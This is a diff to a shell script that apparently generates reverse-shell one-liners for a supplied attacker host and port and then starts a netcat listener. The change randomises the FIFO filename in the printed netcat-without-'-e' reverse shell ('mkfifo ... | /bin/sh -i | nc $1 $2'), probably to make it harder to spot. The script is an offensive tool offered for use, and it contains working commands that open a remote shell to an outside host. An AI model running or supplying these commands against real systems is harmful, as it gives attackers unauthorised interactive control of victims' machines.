@@ -30,10 +30,11 @@ do
 done
 unset concho_ports_in_use
 
+conchofilename=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -$((RANDOM%7+3)) | head -1)
 
 # Netcat shells
 printf ".. Netcat without '-e' ..\n.-------------------------------.\n"
-printf "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 > /tmp/f\n"
+printf "rm /tmp/$conchofilename; mkfifo /tmp/$conchofilename; cat /tmp/$conchofilename|/bin/sh -i 2>&1|nc $1 $2 > /tmp/$conchofilename\n"
 printf ".-------------------------------.\n\n"
 
 printf ".. Netcat with '-e' RevShell ..\n.-------------------------------.\n"
@@ -75,5 +76,7 @@ printf ".-------------------------------.\n\n\n"
 
 
 printf "${GREEN}Starting simple listener with \'nc -lnvp $2\'\n${NC}"
+
+
 
 nc -lnvp $2
